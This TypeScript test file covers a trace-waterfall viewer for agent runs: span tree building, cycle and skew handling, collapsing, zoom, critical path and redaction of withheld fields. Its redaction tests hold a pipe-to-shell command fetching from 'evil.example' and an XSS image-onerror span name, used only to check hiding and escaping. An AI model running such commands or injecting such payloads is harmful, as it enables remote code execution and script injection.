import { describe, expect, it } from "vitest";
import type { EventOut } from "@/lib/api/types";
import { deriveSpans } from "@/lib/spans";
import {
  AUTO_COLLAPSE_SPANS,
  MAX_INDENT,
  ROOT_ID,
  agentChip,
  agentOrder,
  autoCollapseDepth,
  buildTree,
  colourClass,
  criticalPath,
  laneRows,
  nodeLabel,
  panView,
  runBounds,
  scale,
  spanLabel,
  ticks,
  timeDomain,
  tooltipFields,
  treeRows,
  viewport,
  zoomView,
  FIT,
  type Tree,
} from "@/lib/waterfall";
import { WITHHELD_TEXT } from "@/lib/withheld";
import { BASE, at, ev, spn, tool } from "./spanEvents";

function tree(events: EventOut[], bounds = { startMs: BASE, endMs: BASE + 100_000 }): Tree {
  return buildTree([...deriveSpans(events).values()], bounds);
}
const rowKeys = (t: Tree, toggled = new Set<string>(), auto: number | null = null) =>
  treeRows(t, toggled, auto).map((r) => r.key);

describe("buildTree", () => {
  it("hangs a forest (no root span) under one synthetic run root, ordered by start", () => {
    const t = tree([...tool(3, 5, 6), ...tool(1, 0, 4), ...tool(2, 0, 9)]);
    expect(t.root.id).toBe(ROOT_ID);
    expect(t.root.span).toBeNull();
    expect(t.root.children).toEqual([spn(1), spn(2), spn(3)]); // start, then span id
    expect(t.root.startMs).toBe(BASE);
    expect(t.spanCount).toBe(3);
    expect(t.order).toHaveLength(4);
  });

  it("nests by parent_span_id, never by time, and keeps a late parent's children", () => {
    const t = tree([
      ...tool(2, 1, 4, { parent: 1 }),
      ...tool(1, 0, 6),
      ...tool(3, 2, 3, { parent: 2 }),
    ]);
    expect(t.nodes.get(spn(2))!.parentId).toBe(spn(1));
    expect(t.nodes.get(spn(3))!.depth).toBe(3);
    expect(t.root.descendants).toBe(3);
  });

  it("keeps an orphan, flags it, and puts it under the root", () => {
    const t = tree(tool(2, 1, 4, { parent: 99 }));
    const n = t.nodes.get(spn(2))!;
    expect(n.flags.orphan).toBe(true);
    expect(n.parentId).toBe(ROOT_ID);
    expect(n.depth).toBe(1);
  });

  it("breaks a cycle at the smallest span id, flags it, and drops no span", () => {
    // 7 -> 5 -> 6 -> 7, found from 7 first, so the cut is not simply where the walk began
    const t = tree([
      ...tool(7, 0, 4, { parent: 5 }),
      ...tool(5, 1, 3, { parent: 6 }),
      ...tool(6, 1, 2, { parent: 7 }),
    ]);
    expect(t.spanCount).toBe(3);
    expect(t.order).toHaveLength(4); // every span reachable from the root exactly once
    expect(new Set(t.order).size).toBe(4);
    expect(t.nodes.get(spn(5))!.flags.cycle).toBe(true);
    expect(t.nodes.get(spn(5))!.parentId).toBe(ROOT_ID);
    expect(t.nodes.get(spn(7))!.flags.cycle).toBe(false);
    expect(t.nodes.get(spn(7))!.parentId).toBe(spn(5));
    expect(t.nodes.get(spn(6))!.parentId).toBe(spn(7));
  });

  it("survives a span that is its own parent and a two-span cycle", () => {
    const self = tree(tool(1, 0, 1, { parent: 1 }));
    expect(self.order).toHaveLength(2);
    expect(self.nodes.get(spn(1))!.flags.cycle).toBe(true);
    const two = tree([...tool(1, 0, 4, { parent: 2 }), ...tool(2, 1, 3, { parent: 1 })]);
    expect(two.order).toHaveLength(3);
    expect(two.nodes.get(spn(1))!.flags.cycle).toBe(true);
  });

  it("walks a 10,000-deep chain iteratively, caps the indent and keeps the real level", () => {
    const events: EventOut[] = [];
    for (let i = 1; i <= 10_000; i++)
      events.push(...tool(i, i / 1000, (20_001 - i) / 1000, { parent: i > 1 ? i - 1 : null }));
    const t = tree(events);
    expect(t.spanCount).toBe(10_000);
    expect(t.nodes.get(spn(10_000))!.depth).toBe(10_000);
    const rows = treeRows(t, new Set(), null);
    expect(rows).toHaveLength(10_001);
    const last = rows.at(-1)!;
    expect(last.kind === "span" && last.indent).toBe(MAX_INDENT);
    expect(last.kind === "span" && last.level).toBe(10_001);
    expect(criticalPath(t).spanIds.size).toBe(10_000);
  });

  it("copes with thousands of roots", () => {
    const events: EventOut[] = [];
    for (let i = 1; i <= 5000; i++) events.push(...tool(i, i / 100, i / 100 + 1));
    const t = tree(events);
    expect(t.root.children).toHaveLength(5000);
    expect(treeRows(t, new Set(), null)).toHaveLength(5001);
  });

  it("ends an unfinished span at the run's end and flags it", () => {
    const t = tree(tool(1, 10, null), { startMs: BASE, endMs: BASE + 60_000 });
    const n = t.nodes.get(spn(1))!;
    expect(n.flags.unfinished).toBe(true);
    expect(n.endMs).toBe(BASE + 60_000);
  });

  it("does not throw for a span with no opener or no timestamps it can parse", () => {
    const closeOnly = ev("tool.call.completed", 1, 5, { status: "success" });
    const t = tree([closeOnly]);
    const n = t.nodes.get(spn(1))!;
    expect(n.flags.unfinished).toBe(false);
    expect(n.startMs).toBeLessThanOrEqual(n.endMs);
    const bad = { ...closeOnly, occurred_at: "not a date" } as EventOut;
    expect(() => tree([bad])).not.toThrow();
  });

  it("flags a child whose timestamps precede its parent's as clock skew", () => {
    const t = tree([
      ...tool(1, 10, 20, { agent: "parent" }),
      ...tool(2, 3, 5, { parent: 1, agent: "child" }),
      ...tool(3, 12, 14, { parent: 1 }),
    ]);
    expect(t.nodes.get(spn(2))!.flags.skewed).toBe(true);
    expect(t.nodes.get(spn(3))!.flags.skewed).toBe(false);
    expect(t.nodes.get(spn(1))!.flags.skewed).toBe(false);
    // clamped into the parent for the walk
    expect(t.nodes.get(spn(2))!.clampStartMs).toBe(BASE + 10_000);
  });

  it("does not call a crashed (unfinished) child of a finished parent skewed", () => {
    const t = tree([...tool(1, 0, 5), ...tool(2, 1, null, { parent: 1 })]);
    expect(t.nodes.get(spn(2))!.flags.skewed).toBe(false);
  });

  it("aggregates a subtree: count, earliest start, latest end, error", () => {
    const t = tree([
      ...tool(1, 0, 10),
      ...tool(2, 1, 4, { parent: 1 }),
      ev("tool.call.started", 3, 2, { parent: 1, attrs: { "tool.name": "x" } }),
      ev("tool.call.failed", 3, 9, { parent: 1, status: "error" }),
    ]);
    const n = t.nodes.get(spn(1))!;
    expect(n.descendants).toBe(2);
    expect(n.subtreeError).toBe(true);
    expect(n.subtreeStartMs).toBe(BASE);
    expect(n.subtreeEndMs).toBe(BASE + 10_000);
    expect(t.nodes.get(spn(2))!.subtreeError).toBe(false);
  });
});

describe("rows", () => {
  const nested = () =>
    tree([
      ...tool(1, 0, 10, { agent: "planner" }),
      ...tool(2, 1, 6, { parent: 1, agent: "coder" }),
      ...tool(3, 2, 4, { parent: 2, agent: "coder" }),
      ...tool(4, 7, 9, { parent: 1, agent: "reviewer" }),
    ]);

  it("lists the tree depth-first from the run root, start-ordered", () => {
    expect(rowKeys(nested())).toEqual([ROOT_ID, spn(1), spn(2), spn(3), spn(4)]);
  });

  it("collapses a subtree into one aggregate row and expands it again", () => {
    const t = nested();
    const rows = treeRows(t, new Set([spn(1)]), null);
    // spn(1) is expanded by default, so toggling collapses it
    expect(rows.map((r) => `${r.kind}:${r.key}`)).toEqual([
      `span:${ROOT_ID}`,
      `aggregate:${spn(1)}`,
    ]);
    const agg = rows[1]!;
    expect(agg.kind === "aggregate" && agg.aggregate).toEqual({
      count: 4,
      startMs: BASE,
      endMs: BASE + 10_000,
      hasError: false,
    });
    expect(rowKeys(t, new Set())).toHaveLength(5);
  });

  it("auto-collapses below depth 2 above 2,000 spans, and a toggle expands one", () => {
    const events: EventOut[] = [...tool(1, 0, 3000)];
    for (let i = 2; i <= AUTO_COLLAPSE_SPANS + 5; i++) {
      events.push(...tool(i, i / 1000, i / 1000 + 0.0005, { parent: i === 2 ? 1 : 2 }));
    }
    const t = tree(events, { startMs: BASE, endMs: BASE + 3_000_000 });
    expect(autoCollapseDepth(t)).toBe(2);
    expect(autoCollapseDepth(tree(tool(1, 0, 1)))).toBeNull();
    const collapsed = treeRows(t, new Set(), 2);
    // root, spn1 (depth 1), spn2 (depth 2, collapsed into one aggregate of everything below it)
    expect(collapsed.map((r) => r.kind)).toEqual(["span", "span", "aggregate"]);
    const open = treeRows(t, new Set([spn(2)]), 2);
    expect(open.length).toBeGreaterThan(AUTO_COLLAPSE_SPANS);
  });

  it("lanes: one header per agent in first-start order, spans grouped under it", () => {
    const t = nested();
    const rows = laneRows(t);
    expect(rows.map((r) => (r.kind === "lane" ? `lane:${r.agentId}` : r.key))).toEqual([
      "lane:planner",
      spn(1),
      "lane:coder",
      spn(2),
      spn(3),
      "lane:reviewer",
      spn(4),
    ]);
    const coder = rows.find((r) => r.kind === "lane" && r.agentId === "coder")!;
    expect(coder.kind === "lane" && coder.delegatedBy).toBe("planner");
    expect(coder.kind === "lane" && coder.count).toBe(2);
    expect(agentOrder(t)).toEqual(["planner", "coder", "reviewer"]);
  });
});

describe("scale", () => {
  const domain = { startMs: 1000, endMs: 11_000 };

  it("maps time to percent at fit and respects zoom and pan", () => {
    const fit = scale(domain, 1, 0, 100);
    expect(fit.x(1000)).toBe(0);
    expect(fit.x(6000)).toBe(50);
    expect(fit.w(2500)).toBe(25);
    const zoomed = scale(domain, 2, 0, 100);
    expect(zoomed.x(6000)).toBe(100);
    expect(zoomed.w(2500)).toBe(50);
    const panned = scale(domain, 2, 5000, 100);
    expect(panned.x(6000)).toBe(0);
    expect(panned.invert(100)).toBe(11_000);
  });

  it("clamps zoom and pan to the domain and survives nonsense", () => {
    expect(viewport(domain, { zoom: 0.1, panMs: -5 })).toEqual(domain);
    expect(viewport(domain, { zoom: 2, panMs: 99_999 })).toEqual({ startMs: 6000, endMs: 11_000 });
    expect(viewport(domain, { zoom: NaN, panMs: NaN })).toEqual(domain);
  });

  it("zooms about an anchor and pans by window fractions, staying inside the domain", () => {
    const z = zoomView(domain, FIT, 2, 0.5);
    expect(viewport(domain, z)).toEqual({ startMs: 3500, endMs: 8500 });
    expect(zoomView(domain, z, 0.25, 0.5)).toEqual(FIT);
    expect(viewport(domain, panView(domain, z, 1))).toEqual({ startMs: 6000, endMs: 11_000 });
    expect(viewport(domain, panView(domain, z, -10)).startMs).toBe(1000);
  });

  it("makes round ticks labelled as offsets from the domain start", () => {
    const t = ticks(domain, domain, 5);
    expect(t.length).toBeGreaterThan(2);
    expect(t[0]).toEqual({ ms: 1000, label: "+0ms" });
    expect(t.every((x) => x.ms >= 1000 && x.ms <= 11_000)).toBe(true);
    expect(ticks(domain, { startMs: 5, endMs: 5 })).toEqual([]);
  });

  it("timeDomain is never zero-width", () => {
    const t = tree(tool(1, 0, 0), { startMs: BASE, endMs: BASE });
    const d = timeDomain(t);
    expect(d.endMs).toBeGreaterThan(d.startMs);
  });

  it("runBounds uses completion, else the last event, and never inverts", () => {
    const run = {
      started_at: at(0),
      completed_at: null,
      summary: { last_event_at: at(30) },
    };
    expect(runBounds(run)).toEqual({ startMs: BASE, endMs: BASE + 30_000 });
    expect(runBounds({ ...run, completed_at: at(40) }).endMs).toBe(BASE + 40_000);
    expect(runBounds({ ...run, summary: {} })).toEqual({ startMs: BASE, endMs: BASE });
  });
});

describe("critical path", () => {
  const ids = (t: Tree) => [...criticalPath(t).spanIds].sort();

  it("follows the whole chain", () => {
    const t = tree([
      ...tool(1, 0, 10),
      ...tool(2, 1, 9, { parent: 1 }),
      ...tool(3, 2, 8, { parent: 2 }),
    ]);
    expect(ids(t)).toEqual([spn(1), spn(2), spn(3)]);
  });

  it("takes only the slowest branch of a fan-out", () => {
    const t = tree([
      ...tool(1, 0, 10),
      ...tool(2, 1, 4, { parent: 1 }),
      ...tool(3, 1, 9, { parent: 1 }),
      ...tool(4, 2, 6, { parent: 1 }),
    ]);
    expect(ids(t)).toEqual([spn(1), spn(3)]);
  });

  it("chains sequential children and skips the parallel one that finishes earlier", () => {
    const t = tree([
      ...tool(1, 0, 10),
      ...tool(2, 0, 4, { parent: 1 }),
      ...tool(3, 4, 9, { parent: 1 }),
      ...tool(4, 1, 3, { parent: 1 }),
    ]);
    expect(ids(t)).toEqual([spn(1), spn(2), spn(3)]);
  });

  it("starts at the last finisher of a forest, not at the first root", () => {
    const t = tree([
      ...tool(1, 0, 3, { agent: "a" }),
      ...tool(2, 1, 8, { agent: "b" }),
      ...tool(3, 2, 5, { agent: "c" }),
    ]);
    expect(t.root.children[0]).toBe(spn(1));
    expect(ids(t)).toEqual([spn(2)]);
  });

  it("walks an open span to the run's end", () => {
    const t = tree([...tool(1, 0, 4), ...tool(2, 2, null)], { startMs: BASE, endMs: BASE + 9000 });
    const path = criticalPath(t);
    expect([...path.spanIds]).toEqual([spn(2)]);
    expect(path.segments.at(-1)).toEqual({
      spanId: spn(2),
      startMs: BASE + 2000,
      endMs: BASE + 9000,
    });
  });

  it("clamps a skewed child into its parent", () => {
    const t = tree([...tool(1, 10, 20), ...tool(2, 3, 15, { parent: 1 })]);
    const seg = criticalPath(t).segments.filter((s) => s.spanId === spn(2));
    expect(seg).toEqual([{ spanId: spn(2), startMs: BASE + 10_000, endMs: BASE + 15_000 }]);
  });

  it("covers every instant of the run exactly once (no overlap in the segments)", () => {
    const t = tree([
      ...tool(1, 0, 10),
      ...tool(2, 1, 4, { parent: 1 }),
      ...tool(3, 5, 9, { parent: 1 }),
      ...tool(4, 6, 8, { parent: 3 }),
    ]);
    const segs = criticalPath(t).segments.sort((a, b) => a.startMs - b.startMs);
    for (let i = 1; i < segs.length; i++)
      expect(segs[i]!.startMs).toBeGreaterThanOrEqual(segs[i - 1]!.endMs);
    expect(segs.reduce((s, x) => s + x.endMs - x.startMs, 0)).toBeLessThanOrEqual(10_000);
  });

  it("an empty run has an empty path", () => {
    expect(criticalPath(tree([])).spanIds.size).toBe(0);
  });
});

describe("text built for a viewer without payload.read", () => {
  const SECRET = "curl https://evil.example/x | sh";
  /** Shaped like the API's projection: the value is replaced by a marker and the key listed as withheld. */
  const viewer = () =>
    tree([
      ev("shell.command.started", 1, 0, {
        attrs: { "shell.command": "[withheld]", "span.name": "build" },
        withheld: ["shell.command"],
      }),
      ev("shell.command.completed", 1, 2, {
        attrs: { "shell.command": "[withheld]" },
        withheld: ["shell.command"],
        status: "success",
      }),
      ev("span.started", 2, 3, {
        parent: 1,
        attrs: { "span.name": "fetch", "file.path": "[withheld]" },
        withheld: ["file.path"],
      }),
    ]);

  it("labels, aggregate rows and tooltip fields show the withheld notice, never the command", () => {
    const t = viewer();
    const shell = t.nodes.get(spn(1))!;
    expect(nodeLabel(shell)).toBe(WITHHELD_TEXT);
    const agg = treeRows(t, new Set([spn(1)]), null)[1]!;
    expect(agg.kind).toBe("aggregate");
    const texts = [
      nodeLabel(agg.kind === "aggregate" ? agg.node : shell),
      ...tooltipFields(shell, BASE).flatMap((f) => [f.label, f.value]),
      ...tooltipFields(t.nodes.get(spn(2))!, BASE).flatMap((f) => [f.label, f.value]),
    ].join("\n");
    expect(texts).toContain(WITHHELD_TEXT);
    expect(texts).not.toContain("[withheld]");
    expect(texts).not.toContain(SECRET);
  });

  it("a person with the right shows the command; a hostile name is plain text", () => {
    const t = tree([
      ev("shell.command.started", 1, 0, { attrs: { "shell.command": SECRET } }),
      ev("span.started", 2, 1, {
        attrs: { "span.name": '<img src=x onerror="alert(1)">'.repeat(20) },
      }),
    ]);
    expect(nodeLabel(t.nodes.get(spn(1))!)).toContain(SECRET);
    const hostile = nodeLabel(t.nodes.get(spn(2))!);
    expect(hostile.length).toBeLessThanOrEqual(80);
    expect(hostile.startsWith("<img")).toBe(true); // text; React escapes it
  });

  it("agent spans are labelled by name or agent id, clipped to 64 for chips", () => {
    const named = deriveSpans([
      ev("agent.started", 1, 0, { agent: "researcher", attrs: { "span.name": "Researcher" } }),
    ]);
    expect(spanLabel([...named.values()][0]!)).toBe("Researcher");
    const bare = deriveSpans([ev("agent.started", 2, 0, { agent: "coder" })]);
    expect(spanLabel([...bare.values()][0]!)).toBe("coder");
    expect(agentChip("x".repeat(500))).toHaveLength(64);
  });

  it("the root is called Run and its tooltip needs no span", () => {
    const t = viewer();
    expect(nodeLabel(t.root)).toBe("Run");
    expect(tooltipFields(t.root, BASE).map((f) => f.label)).toEqual(["Span", "Start", "Duration"]);
  });
});

describe("misc", () => {
  it("colours by status first, then kind, with a fallback", () => {
    expect(colourClass("tool", "error")).toBe("wf-error");
    expect(colourClass("llm", "timeout")).toBe("wf-timeout");
    expect(colourClass("llm", "success")).toBe("wf-kind-llm");
    expect(colourClass(null, null)).toBe("wf-kind-other");
    expect(colourClass("weird", null)).toBe("wf-kind-other");
  });
});
